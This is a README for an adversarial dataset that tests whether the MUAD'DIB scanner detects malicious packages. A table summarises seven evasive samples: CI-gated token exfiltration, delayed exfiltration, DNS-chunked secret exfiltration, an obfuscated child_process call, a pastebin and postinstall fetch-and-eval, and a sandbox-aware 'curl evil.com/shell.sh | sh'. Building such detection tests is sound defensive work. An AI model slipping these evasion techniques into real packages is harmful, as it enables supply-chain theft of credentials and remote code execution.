# Adversarial Dataset

Evasive malicious samples designed to test MUAD'DIB's detection capabilities against real-world attack techniques.

## Samples

| Sample | Technique | Evasion | Expected Score |
|--------|-----------|---------|----------------|
| `ci-trigger-exfil/` | Reads `GITHUB_TOKEN` and exfiltrates via HTTPS | Only activates when `CI` or `GITHUB_ACTIONS` env is set | >= 50 |
| `delayed-exfil/` | Exfiltrates `NPM_TOKEN` via fetch | 10-minute `setTimeout` delay to evade short-lived sandboxes | >= 30 |
| `docker-aware/` | Executes `curl evil.com/shell.sh \| sh` | Checks for `/.dockerenv` — skips execution inside Docker/sandbox | >= 50 |
| `staged-fetch/` | Downloads payload from pastebin then `eval()`s it | Two-stage: fetch remote code at runtime, no malicious code on disk | >= 40 |
| `dns-chunk-exfil/` | Exfiltrates `AWS_SECRET_ACCESS_KEY` via DNS queries | Hex-encodes secret and splits into DNS subdomain chunks | >= 40 |
| `string-concat-obfuscation/` | `require('child_process').exec('whoami')` | Rebuilds `"child_process"` via string concatenation to evade literal matching | >= 30 |
| `postinstall-download/` | Downloads and `eval()`s remote code at install time | No `index.js` — entire payload is a one-liner in `postinstall` script | >= 50 |

## Purpose

These samples validate that MUAD'DIB detects evasive techniques commonly used in real supply-chain attacks. Each sample uses a different evasion strategy to avoid naive static analysis.

## Scoring

A sample is considered **detected** if its scan score meets or exceeds the expected threshold.
